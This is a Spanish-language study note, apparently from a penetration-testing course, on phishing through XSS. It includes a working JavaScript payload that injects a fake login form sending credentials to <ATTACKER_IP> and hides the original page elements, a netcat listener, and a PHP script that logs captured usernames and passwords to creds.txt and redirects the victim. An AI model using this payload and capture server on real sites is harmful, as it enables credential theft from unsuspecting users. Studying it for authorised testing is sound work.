---
tags:
  - xss
  - phishing
  - webapp
---
## Conceptos Clave (TL;DR)
* Los ataques de phishing por XSS inyectan formularios de inicio de sesión falsos en aplicaciones web vulnerables que los usuarios consideran de confianza.
* El objetivo es engañar a las víctimas para que envíen su información sensible (credenciales) al servidor del atacante.
* Para aumentar la credibilidad, se manipula el DOM mediante JavaScript para ocultar elementos originales de la página, haciendo que el inicio de sesión parezca un requisito obligatorio y legítimo.

## Herramientas Clave
* Inspector de Elementos (CTRL+SHIFT+C): Para revisar el código fuente y encontrar los IDs exactos de los elementos HTML que se desean eliminar (ej. campos de entrada originales).
* Netcat (nc): Para levantar un listener rápido y verificar la recepción de peticiones HTTP con las credenciales por método GET.
* Servidor de Desarrollo PHP: Para ejecutar un script que capture las credenciales en texto plano de forma silenciosa y redirija a la víctima a la página original, evadiendo sospechas.

## Metodología Paso a Paso
1. Descubrimiento XSS: Encontrar un vector funcional (ej. Reflected XSS) que permita la ejecución de código JavaScript en la aplicación objetivo.
2. Inyección del Formulario Falso: Utilizar la función `document.write()` en el payload XSS para plasmar código HTML de un login estructurado apuntando a la IP controlada.
3. Limpieza de Interfaz (Evasión): Usar `document.getElementById('<ID>').remove()` para borrar elementos legítimos que que delaten la falsedad de la página, forzando la interacción con el login inyectado.
4. Preparación del Servidor de Captura: Configurar un listener (Netcat para pruebas, PHP para operaciones realistas) en el puerto especificado en el formulario inyectado.
5. Distribución y Captura: Enviar la URL con el payload a la víctima. Al iniciar sesión, las credenciales viajan en los parámetros GET de la petición HTTP hacia el atacante.

## Cheat Sheet de Comandos

### Payload XSS (Inyección y Limpieza del DOM)
```javascript
# Inyecta un formulario falso apuntando a nuestra IP, remueve el elemento original por su ID y comenta el HTML sobrante.

# Reemplazar <ATTACKER_IP> y <TARGET_HTML_ID>.

document.write('<h3>Please login to continue</h3><form action=http://<ATTACKER_IP>><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('<TARGET_HTML_ID>').remove();
```
### Comentario HTML (Cierre)
```ghtml
Se añade al final de la URL/Payload XSS para ocultar cualquier porción de código original que quede rota.

<!--
```
### Listener Básico (Netcat)
```bash
# Levanta un puerto a la escucha. Rápido, pero genera error de conexión en el navegador de la víctima.
sudo nc -lvnp <ATTACKER_PORT>
```
### Script de Captura y Redirección (PHP)
```php
# index.php: Lee las variables GET, las guarda en creds.txt y redirige a la víctima.
# Reemplazar <TARGET_IP> y <TARGET_PATH>.
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("creds.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://<TARGET_IP></TARGET_PATH>");
    fclose($file);
    exit();
}
?>
```
### Despliegue de Servidor de Captura (PHP)
```bash
# Crea el entorno, asume la creación de index.php dentro, y levanta el servidor en todas las interfaces.
mkdir /tmp/tmpserver
cd /tmp/tmpserver
sudo php -S 0.0.0.0:<ATTACKER_PORT>
```

## "Gotchas" y Troubleshooting
* Error "This site can’t be reached": Sucede si la víctima envía el formulario pero el atacante no tiene un puerto a la escucha en la IP especificada.
* Alerta de Sospecha ("Unable to connect"): Si se usa solo Netcat, la herramienta captura los datos pero no completa el handshake HTTP correctamente, mostrando un error visible a la vítima. En pruebas de phishing realistas, siempre se debe usar el servidor PHP con redirección.
* Identificacion Errónea de Elementos: Para que `.remove()` funcione, el ID proporcionado debe ser exacto. Verificar siempre con el inspector de página.
* Basura Visual en Pantalla: Si quedan restos del formulario o página original despues de la inyeccion, es porque falto incluir el comentario HTML de apertura (``<!--)`` al final del payload XSS.